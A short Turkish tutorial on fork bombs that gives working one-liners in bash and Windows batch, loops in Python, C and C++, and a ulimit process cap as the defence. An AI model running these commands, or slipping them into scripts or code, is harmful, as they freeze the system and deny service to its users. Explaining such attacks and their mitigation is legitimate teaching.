Fork Bomb, bir işletim sistemindeki işlemciyi yormak ve kaynakları tüketmek için kullanılan bir saldırı yöntemidir. Ne kadar güçlü bir işlemciniz olursa olsun sonuç kaçınılmazdır.

## Peki Bu Saldırı Yöntemini Nasıl Yapabiliriz?

Öncelikle Linux işletim sisteminde komut satırını açıp. Aşağıdaki komutu yazıyoruz.

```bash
:(){ :|:& };:
```

Peki bu saldırı sadece Linux işletim sisteminde mi çalışıyor. Hayır, saldırı sadece Linux işletim sisteminde değil, windows işletim sisteminde de çalışmaktadır. Aşağıdaki komutu windows işletim sisteminde çalıştırırsanız saldırı başlayacaktır.

```batch
%0|%0
```

> **Uyarı:** Bu komutu çalıştırdıktan kısa bir süre sonra işletim sisteminizin donmasına ve işlem yapılamaz hale gelmesine sebep olacaktır. Bu yüzden komutu çalıştırmadan önce sisteminizde önemli bir işlem açık olmadığından emin olun.

## Diğer Programlama Dillerinde Fork Bomb

Yukarda bahsettiğimiz komutlar Linux özelinde **bash** ve windows özelinde **batch** komutlarıdır.

Peki diğer programlama dillerinde Fork Bomb nasıl yapılır?

### Python

```python
import os

while 1:
  os.fork()
```

### C

```c
#include <unistd.h>

int main() {
  while(1) fork();
}
```

### C++

```cpp
#include <cstdlib>

int main(int argc, char **argv) {
  while (1) system(argv[0]);
  return 0;
}
```

Diğer dillerde de kullanımını merak ediyorsanız [buradan](https://github.com/aaronryank/fork-bomb) inceleyebilirsiniz.

## Peki Bu Saldırı Yöntemini Nasıl Engelleyebiliriz?

Bu saldırı yöntemini engellemek için bir çok yöntem bulunmaktadır. Bunlardan bir tanesi kullanıcı bazlı işlem limiti ayarlamaktır.

Örnek vermek gerekirse Muhammet Emin Akalan kullanıcısının işlem limiti 1000 olarak ayarlanmış olsun. Bu durumda saldırı başladıktan kısa bir süre sonra limit aşıldığı için saldırı duracaktır.

### İşlem Limiti Ayarlamak

İşlem limiti ayarlamak için aşağıdaki komutu kullanabilirsiniz.

```bash
ulimit -u 1000
```

Bu komutu yazdıktan sonra işlem limiti 1000 olarak ayarlanmış olacaktır.
